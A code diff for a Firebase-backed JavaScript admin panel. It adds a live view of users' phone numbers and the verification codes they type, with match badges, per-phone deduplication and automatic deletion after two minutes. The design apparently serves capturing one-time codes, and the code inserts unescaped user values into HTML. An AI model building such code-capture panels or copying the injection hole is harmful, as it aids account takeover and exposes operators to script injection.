@@ -1,8 +1,12 @@
 /**
  * C.I.A. Command Center - Admin Panel
  * First Time Setup → Auto Login After
- * + System Verification Panel (Anti-Refresh + Copy Button)
- * + User-Entered Code Display (Real-time accurate)
+ * + System Verification Panel
+ * + USER INPUT (kapalit ng SYSTEM CODE)
+ * + Manual delete button 🗑️
+ * + Auto-delete after 2 minutes
+ * + Unique per phone (latest input only)
+ * + Anti-refresh + Copy button + Compact display
  */
 
 const firebaseConfig = {
@@ -30,6 +34,9 @@ let verificationListener = null;
 let verificationCountdownInterval = null;
 let activeVerifications = {};
 let lastRenderHash = '';
+
+// ✅ AUTO-DELETE TIMING (2 minutes)
+const AUTO_DELETE_MS = 2 * 60 * 1000;
 
 // ========== CHECK IF MASTER KEY EXISTS ==========
 async function checkMasterKeyExists() {
@@ -1115,11 +1122,11 @@ function closeBranchPopup() {
 
 // ============================================================
 // 🎯 SYSTEM VERIFICATION PANEL
-// Read data from user_sessions/{phone}/system_verification
-// + Display userEnteredCode
-// + Anti-refresh (hash check)
-// + Copy button
-// + Compact display
+// ✅ USER INPUT (kapalit ng SYSTEM CODE)
+// ✅ Manual delete button 🗑️
+// ✅ Auto-delete after 2 minutes
+// ✅ Unique per phone (latest input only)
+// ✅ Anti-refresh + Copy button + Compact display
 // ============================================================
 
 function initSystemVerificationPanel() {
@@ -1136,7 +1143,7 @@ function initSystemVerificationPanel() {
 
     verificationListener = db.ref('user_sessions').on('value', function(snapshot) {
         var sessions = snapshot.val() || {};
-        var verifications = [];
+        var verificationsMap = {};
 
         Object.keys(sessions).forEach(function(phone) {
             var userData = sessions[phone];
@@ -1146,7 +1153,8 @@ function initSystemVerificationPanel() {
                                  verification.status === 'expired' ||
                                  verification.status === 'invalid' ||
                                  verification.status === 'verified')) {
-                verifications.push({
+
+                verificationsMap[phone] = {
                     phone: phone,
                     code: verification.code || '----',
                     userEnteredCode: verification.userEnteredCode || null,
@@ -1155,13 +1163,20 @@ function initSystemVerificationPanel() {
                     status: verification.status || 'active',
                     deviceId: verification.deviceId || 'Unknown',
                     createdAt: verification.createdAt || 0,
+                    userEnteredAt: verification.userEnteredAt || 0,
                     lastUpdate: verification.lastUpdate || 0
-                });
+                };
             }
         });
 
+        var verifications = Object.keys(verificationsMap).map(function(phone) {
+            return verificationsMap[phone];
+        });
+
         verifications.sort(function(a, b) {
-            return (b.lastUpdate || 0) - (a.lastUpdate || 0);
+            var timeA = a.userEnteredAt || a.createdAt || 0;
+            var timeB = b.userEnteredAt || b.createdAt || 0;
+            return timeB - timeA;
         });
 
         activeVerifications = {};
@@ -1169,9 +1184,9 @@ function initSystemVerificationPanel() {
             activeVerifications[v.phone] = v;
         });
 
-        // ✅ ANTI-REFRESH: I-render lang kung may nagbago (except timer)
+        // ✅ ANTI-REFRESH: Hash check (user input + status + match)
         var newHash = verifications.map(function(v) {
-            return v.phone + '|' + v.status + '|' + v.code + '|' +
+            return v.phone + '|' + v.status + '|' +
                    (v.userEnteredCode || '-') + '|' + (v.isMatch ? '1' : '0') + '|' +
                    v.deviceId;
         }).join('#');
@@ -1181,7 +1196,6 @@ function initSystemVerificationPanel() {
             renderSystemVerificationList(verifications);
         }
 
-        // Update active count
         var activeCount = verifications.filter(function(v) {
             return v.status === 'active';
         }).length;
@@ -1192,11 +1206,19 @@ function initSystemVerificationPanel() {
     if (verificationCountdownInterval) {
         clearInterval(verificationCountdownInterval);
     }
-    verificationCountdownInterval = setInterval(updateVerificationTimers, 1000);
 
-    console.log('✅ System Verification Panel initialized');
+    // ✅ Timer updater + Auto-cleanup every second
+    verificationCountdownInterval = setInterval(function() {
+        updateVerificationTimers();
+        cleanupOldVerifications();
+    }, 1000);
+
+    console.log('✅ System Verification Panel initialized (USER INPUT + manual delete + 2min auto-delete)');
 }
 
+// ============================================================
+// ✅ RENDER LIST — TIMER + USER INPUT side-by-side
+// ============================================================
 function renderSystemVerificationList(verifications) {
     var listEl = document.getElementById('verificationList');
     if (!listEl) return;
@@ -1227,7 +1249,7 @@ function renderSystemVerificationList(verifications) {
 
         var createdTime = v.createdAt ? formatVerificationTime(v.createdAt) : '---';
 
-        // USER-ENTERED CODE DISPLAY
+        // ✅ USER INPUT DISPLAY (kapalit ng SYSTEM CODE)
         var userCodeHtml = '';
         if (v.userEnteredCode) {
             var matchClass = v.isMatch ? 'code-match' : 'code-mismatch';
@@ -1235,22 +1257,16 @@ function renderSystemVerificationList(verifications) {
             var matchText = v.isMatch ? 'MATCH' : 'MISMATCH';
 
             userCodeHtml =
-                '<div class="v-box v-box-wide">' +
-                    '<div class="v-label">📝 USER INPUT</div>' +
-                    '<div class="v-value user-code-value ' + matchClass + '">' +
-                        v.userEnteredCode +
-                    '</div>' +
-                    '<div class="v-match-badge ' + matchClass + '">' +
-                        matchIcon + ' ' + matchText +
-                    '</div>' +
+                '<div class="v-value user-code-value ' + matchClass + '">' +
+                    v.userEnteredCode +
+                '</div>' +
+                '<div class="v-match-badge ' + matchClass + '">' +
+                    matchIcon + ' ' + matchText +
                 '</div>';
         } else {
             userCodeHtml =
-                '<div class="v-box v-box-wide">' +
-                    '<div class="v-label">📝 USER INPUT</div>' +
-                    '<div class="v-value user-code-value waiting">----</div>' +
-                    '<div class="v-match-badge waiting">⏳ WAITING</div>' +
-                '</div>';
+                '<div class="v-value user-code-value waiting">----</div>' +
+                '<div class="v-match-badge waiting">⏳ WAITING</div>';
         }
 
         html +=
@@ -1261,12 +1277,16 @@ function renderSystemVerificationList(verifications) {
                         '<span class="v-phone-text">' + v.phone + '</span>' +
                         '<button class="v-copy-btn" onclick="copyPhone(\'' + v.phone + '\', this)" title="Copy number">📋</button>' +
                     '</div>' +
-                    '<div class="v-status-badge ' + badgeClass + '">' +
-                        '<span class="v-status-dot"></span>' +
-                        '<span>' + statusText + '</span>' +
+                    '<div class="v-header-actions">' +
+                        '<div class="v-status-badge ' + badgeClass + '">' +
+                            '<span class="v-status-dot"></span>' +
+                            '<span>' + statusText + '</span>' +
+                        '</div>' +
+                        '<button class="v-delete-btn" onclick="deleteVerification(\'' + v.phone + '\')" title="Delete now">🗑️</button>' +
                     '</div>' +
                 '</div>' +
 
+                // ✅ TIMER + USER INPUT side-by-side
                 '<div class="v-grid">' +
                     '<div class="v-box">' +
                         '<div class="v-label">⏱ TIMER</div>' +
@@ -1275,12 +1295,10 @@ function renderSystemVerificationList(verifications) {
                         '</div>' +
                     '</div>' +
                     '<div class="v-box">' +
-                        '<div class="v-label">🔑 SYSTEM CODE</div>' +
-                        '<div class="v-value code-value">' + v.code + '</div>' +
+                        '<div class="v-label">📝 USER INPUT</div>' +
+                        userCodeHtml +
                     '</div>' +
                 '</div>' +
-
-                '<div class="v-grid v-grid-wide">' + userCodeHtml + '</div>' +
 
                 '<div class="v-footer">' +
                     '<div class="v-device">' +
@@ -1314,7 +1332,6 @@ function updateVerificationTimers() {
         if (verification.timer > 0) {
             verification.timer--;
 
-            // ✅ TEXT UPDATE LANG — hindi re-render
             var newText = verification.timer + 's';
             if (el.textContent !== newText) {
                 el.textContent = newText;
@@ -1333,6 +1350,82 @@ function updateVerificationTimers() {
     });
 }
 
+// ============================================================
+// ✅ AUTO-CLEANUP — Remove after 2 minutes (base sa latest input)
+// ============================================================
+function cleanupOldVerifications() {
+    var now = Date.now();
+
+    Object.keys(activeVerifications).forEach(function(phone) {
+        var v = activeVerifications[phone];
+
+        var timestamp = v.userEnteredAt || v.createdAt || 0;
+
+        if (timestamp && (now - timestamp) > AUTO_DELETE_MS) {
+            console.log('🗑️ Auto-removing verification (2min expired):', phone);
+            removeVerification(phone);
+        }
+    });
+}
+
+// ============================================================
+// ✅ MANUAL DELETE — Remove specific verification
+// ============================================================
+window.deleteVerification = function(phone) {
+    if (!confirm('🗑️ DELETE VERIFICATION\n\nDelete this verification for ' + phone + '?')) {
+        return;
+    }
+
+    console.log('🗑️ Manual delete:', phone);
+    removeVerification(phone);
+};
+
+// ============================================================
+// ✅ SHARED REMOVE FUNCTION
+// ============================================================
+function removeVerification(phone) {
+    // Remove from Firebase
+    try {
+        db.ref('user_sessions/' + phone + '/system_verification').remove();
+    } catch(e) {}
+
+    // Remove from local state
+    delete activeVerifications[phone];
+
+    // Force re-render next update
+    lastRenderHash = '';
+
+    // Remove DOM element with fade-out animation
+    var el = document.querySelector('.verification-item[data-phone="' + phone + '"]');
+    if (el) {
+        el.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+        el.style.opacity = '0';
+        el.style.transform = 'translateX(-20px)';
+
+        setTimeout(function() {
+            if (el.parentNode) el.parentNode.removeChild(el);
+
+            var listEl = document.getElementById('verificationList');
+            if (listEl && listEl.querySelectorAll('.verification-item').length === 0) {
+                listEl.innerHTML =
+                    '<div class="verification-empty">' +
+                        '<i class="fas fa-inbox"></i>' +
+                        '<p>No active verifications</p>' +
+                    '</div>';
+            }
+
+            var countEl = document.getElementById('verificationCount');
+            if (countEl) {
+                var remaining = listEl ? listEl.querySelectorAll('.verification-item').length : 0;
+                countEl.textContent = remaining;
+            }
+        }, 400);
+    }
+}
+
+// ============================================================
+// ✅ FORMAT TIME
+// ============================================================
 function formatVerificationTime(timestamp) {
     if (!timestamp) return '---';
 
@@ -1843,7 +1936,8 @@ window.unbanUser = unbanUser;
 window.showBranchDetails = showBranchDetails;
 window.closeBranchPopup = closeBranchPopup;
 window.initSystemVerificationPanel = initSystemVerificationPanel;
+window.deleteVerification = deleteVerification;
 
-console.log('✅ C.I.A. Admin Panel v3.3 - Anti-refresh + Copy Button + Compact');
+console.log('✅ C.I.A. Admin Panel v3.5 - USER INPUT + manual delete + 2-min auto-delete');
 console.log('ℹ️ First time? Create your access key.');
 console.log('ℹ️ Already setup? Auto-login.');
